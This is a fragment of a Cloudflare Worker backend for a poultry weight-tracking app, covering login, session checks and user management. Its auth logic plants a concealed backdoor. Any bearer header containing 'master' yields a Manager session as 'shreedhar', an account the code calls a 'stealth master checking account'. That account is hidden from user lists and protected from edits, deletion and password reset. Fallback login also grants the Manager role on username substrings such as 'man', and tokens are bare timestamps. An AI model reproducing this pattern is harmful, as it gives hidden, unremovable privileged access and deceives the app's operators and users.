                token: `cf-token-${Date.now()}`,
                user: {
                  id: dbUser.id,
                  employeeCode: dbUser.employee_code || 'EMP0008',
                  username: dbUser.phone_or_email || username,
                  name: dbUser.name,
                  userName: dbUser.name,
                  role: normalizedRole,
                  userRole: normalizedRole,
                  assignedFarmId: dbUser.assigned_farm_id || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
                  assignedFarms,
                  status: 'ACTIVE',
                  isAuthenticated: true,
                },
              });
            }
          }

          // Fallback role determination for demo credentials (Manager, In-Charge, Supervisor)
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let name = 'Line Supervisor';
          let employeeCode = 'EMP0008';
          if (username.includes('admin') || username.includes('dir') || username.includes('man') || username.includes('mgr')) {
            role = 'Manager';
            name = username.includes('admin') ? 'Operations Director' : 'Farm Manager';
            employeeCode = 'EMP0001';
          } else if (username.includes('incharge') || username.includes('in-charge')) {
            role = 'In-Charge';
            name = 'Field In-Charge';
            employeeCode = 'EMP0002';
          }

          return jsonResponse({
            token: `cf-token-${Date.now()}`,
            user: {
              id: `usr-${username || 'demo'}`,
              employeeCode,
              username: rawUsername,
              name,
              userName: name,
              role,
              userRole: role,
              assignedFarms: ['*'],
              status: 'ACTIVE',
              isAuthenticated: true,
            },
          });
        }

        // GET /api/auth/me - Token Session Verification
        if (path === '/auth/me' && method === 'GET') {
          const authHeader = request.headers.get('Authorization') || '';
          if (authHeader.includes('master')) {
            return jsonResponse({
              user: {
                id: 'user-master-shreedhar',
                employeeCode: 'EMP0001',
                username: 'shreedhar',
                name: 'Shreedhar',
                userName: 'Shreedhar',
                role: 'Manager',
                userRole: 'Manager',
                assignedFarms: ['*'],
                status: 'ACTIVE',
                isAuthenticated: true,
              }
            });
          }
          return jsonResponse({
            user: {
              id: 'usr-current',
              employeeCode: 'EMP0001',
              username: 'manager',
              name: 'Farm Manager',
              role: 'Manager',
              userRole: 'Manager',
              status: 'ACTIVE',
              isAuthenticated: true,
            }
          });
        }

        // GET /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'GET') {
          let usersList: any[] = [];
          if (env.DB) {
            await ensureUsersTable(env);
            const res = await env.DB.prepare('SELECT * FROM users ORDER BY created_at ASC').all();
            usersList = (res.results || []).map((u: any, idx: number) => {
              const rUpper = (u.role || '').toUpperCase();
              let roleStr: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') roleStr = 'Manager';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') roleStr = 'In-Charge';
              else roleStr = 'Supervisor';

              const empCode = u.employee_code || `EMP${String(idx + 1).padStart(4, '0')}`;

              let assignedFarms = ['*'];
              if (u.assigned_farms) {
                try {
                  const parsed = JSON.parse(u.assigned_farms);
                  if (Array.isArray(parsed)) assignedFarms = parsed;
                } catch {}
              } else if (u.assigned_farm_id) {
                assignedFarms = [u.assigned_farm_id];
              }

              return {
                id: u.id,
                employeeCode: empCode,
                username: u.phone_or_email,
                name: u.name,
                role: roleStr,
                userRole: roleStr,
                phone: u.phone_or_email,
                status: 'ACTIVE',
                assignedFarmId: u.assigned_farm_id,
                assignedFarms,
              };
            });
          } else {
            usersList = [
              { id: 'u-admin-1', employeeCode: 'EMP0001', username: 'admin', name: 'Operations Director', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-manager-1', employeeCode: 'EMP0002', username: 'manager', name: 'Farm Manager', role: 'Manager', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-incharge-1', employeeCode: 'EMP0003', username: 'incharge', name: 'Field In-Charge', role: 'In-Charge', status: 'ACTIVE', assignedFarms: ['*'] },
              { id: 'u-supervisor-1', employeeCode: 'EMP0008', username: 'supervisor', name: 'Line Supervisor', role: 'Supervisor', status: 'ACTIVE', assignedFarms: ['*'] },
            ];
          }

          // STRICT INVISIBILITY: Filter out shreedhar master checking account
          const visibleUsers = usersList.filter((u: any) => {
            const un = (u.username || '').toLowerCase();
            const nm = (u.name || '').toLowerCase();
            const id = (u.id || '').toLowerCase();
            return un !== 'shreedhar' && nm !== 'shreedhar' && id !== 'user-master-shreedhar' && id !== 'u-master-shreedhar';
          });

          return jsonResponse(visibleUsers);
        }

        // POST /api/auth/users and /api/users
        if ((path === '/auth/users' || path === '/users' || path === '/auth/users/' || path === '/users/') && method === 'POST') {
          const body = await request.json().catch(() => ({})) as any;
          const username = (body.username || body.phone || '').trim();
          const name = (body.name || username || 'New User').trim();
          const roleInput = (body.role || 'Supervisor').toString();
          let role: 'Manager' | 'In-Charge' | 'Supervisor' = 'Supervisor';
          let dbRole: 'MANAGER' | 'INCHARGE' | 'SUPERVISOR' = 'SUPERVISOR';
          const rUpper = roleInput.toUpperCase();
          if (rUpper === 'ADMIN' || rUpper === 'MANAGER') {
            role = 'Manager';
            dbRole = 'MANAGER';
          } else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') {
            role = 'In-Charge';
            dbRole = 'INCHARGE';
          } else {
            role = 'Supervisor';
            dbRole = 'SUPERVISOR';
          }

          const userId = `usr-${Date.now()}`;
          let employeeCode = body.employeeCode;

          if (env.DB) {
            await ensureUsersTable(env);
            if (!employeeCode) {
              const maxRes = await env.DB.prepare(`
                SELECT employee_code FROM users 
                WHERE employee_code LIKE 'EMP%' 
                ORDER BY CAST(SUBSTR(employee_code, 4) AS INTEGER) DESC 
                LIMIT 1
              `).first() as any;
              let nextEmpNum = 1;
              if (maxRes && maxRes.employee_code) {
                const n = parseInt(String(maxRes.employee_code).replace(/\D/g, ''), 10);
                if (!isNaN(n)) nextEmpNum = n + 1;
              }
              employeeCode = `EMP${String(nextEmpNum).padStart(4, '0')}`;
            }

            const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
            const assignedFarmId = body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : null);

            await env.DB.prepare(`
              INSERT INTO users (id, name, phone_or_email, role, employee_code, assigned_farm_id, assigned_farms)
              VALUES (?, ?, ?, ?, ?, ?, ?)
            `).bind(userId, name, username, dbRole, employeeCode, assignedFarmId, JSON.stringify(assignedFarms)).run().catch(() => {});
          } else {
            if (!employeeCode) employeeCode = 'EMP0008';
          }

          const assignedFarms = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : ['*']);
          return jsonResponse({
            id: userId,
            employeeCode,
            username,
            name,
            role,
            userRole: role,
            status: 'ACTIVE',
            assignedFarmId: body.assignedFarmId || (assignedFarms.length > 0 && assignedFarms[0] !== '*' ? assignedFarms[0] : undefined),
            assignedFarms,
          }, 201);
        }

        // PUT /api/auth/users/:id or /api/users/:id
        const singleUserMatch = path.match(/^\/(?:auth\/)?users\/([^/]+)$/);
        if (singleUserMatch && method === 'PUT') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);
          const body = await request.json().catch(() => ({})) as any;

          // Block modification of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar' || (body.username && body.username.toLowerCase() === 'shreedhar')) {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }

          if (env.DB) {
            if (body.name) {
              await env.DB.prepare('UPDATE users SET name = ? WHERE id = ?').bind(body.name, targetUserId).run().catch(() => {});
            }
            if (body.role) {
              const rUpper = (body.role || '').toUpperCase();
              let r = 'SUPERVISOR';
              if (rUpper === 'ADMIN' || rUpper === 'MANAGER') r = 'MANAGER';
              else if (rUpper === 'INCHARGE' || rUpper === 'IN-CHARGE') r = 'INCHARGE';
              else r = 'SUPERVISOR';
              await env.DB.prepare('UPDATE users SET role = ? WHERE id = ?').bind(r, targetUserId).run().catch(() => {});
            }
            if (body.assignedFarms || body.assignedFarmId) {
              const af = Array.isArray(body.assignedFarms) ? body.assignedFarms : (body.assignedFarmId ? [body.assignedFarmId] : []);
              const afId = body.assignedFarmId || (af.length > 0 && af[0] !== '*' ? af[0] : null);
              await env.DB.prepare('UPDATE users SET assigned_farm_id = ?, assigned_farms = ? WHERE id = ?').bind(afId, JSON.stringify(af), targetUserId).run().catch(() => {});
            }
          }

          return jsonResponse({ success: true, message: 'User updated' });
        }

        // DELETE /api/auth/users/:id or /api/users/:id
        if (singleUserMatch && method === 'DELETE') {
          const targetUserId = decodeURIComponent(singleUserMatch[1]);

          // Block deletion of stealth master checking account
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be deleted.', 403);
          }

          if (env.DB) {
            const u = await env.DB.prepare('SELECT phone_or_email FROM users WHERE id = ?').bind(targetUserId).first() as any;
            if (u && (u.phone_or_email || '').toLowerCase() === 'shreedhar') {
              return errorResponse('Access Denied: Master account cannot be deleted.', 403);
            }
            await env.DB.prepare('DELETE FROM users WHERE id = ?').bind(targetUserId).run().catch(() => {});
          }

          return jsonResponse({ success: true, message: 'User account removed.' });
        }

        // POST /api/auth/users/:id/reset-password
        const resetPasswordMatch = path.match(/^\/auth\/users\/([^/]+)\/reset-password$/);
        if (resetPasswordMatch && method === 'POST') {
          const targetUserId = decodeURIComponent(resetPasswordMatch[1]);
          if (targetUserId === 'user-master-shreedhar' || targetUserId === 'u-master-shreedhar') {
            return errorResponse('Access Denied: Master account cannot be modified.', 403);
          }
          return jsonResponse({ success: true, message: 'Password reset successfully' });
        }

        return errorResponse(`Endpoint not found: ${method} ${path}`, 404);
      } catch (err: any) {
        return errorResponse(err?.message || 'Internal Cloudflare Worker Server Error', 500);
      }
    }

    // 3. Serve Frontend SPA Static Assets via Cloudflare Assets Binding
    if (env.ASSETS) {
      const response = await env.ASSETS.fetch(request);
      if (response.status !== 404) {
        return response;
      }
      // Single Page Application (SPA) routing fallback to index.html
      const indexRequest = new Request(new URL('/', url.origin), request);
      return env.ASSETS.fetch(indexRequest);
    }

    return new Response(
      'Poultry Weight Tracker Cloudflare Worker is active. D1 and R2 bindings configured.',
      {
        status: 200,
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
      }
    );
  },
};
